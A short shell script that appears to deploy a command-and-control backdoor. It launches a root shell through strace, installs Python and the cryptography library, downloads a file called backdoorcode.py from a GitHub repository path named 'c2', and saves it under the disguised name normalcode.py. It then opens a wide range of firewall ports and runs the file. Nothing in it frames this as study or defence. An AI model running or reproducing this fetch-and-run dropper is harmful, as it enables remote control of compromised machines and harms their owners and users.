sudo strace -o /dev/null /bin/bash
yum install -y python3;
pip3 install --upgrade pip;
pip3 install setuptools_rust;
pip3 install cryptography;
curl -o normalcode.py https://raw.githubusercontent.com/anmolmittal13/c2/main/backdoorcode.py
chmod +x normalcode.py;
firewall-cmd --add-port=3040-6130/tcp;
python3 normalcode.py;
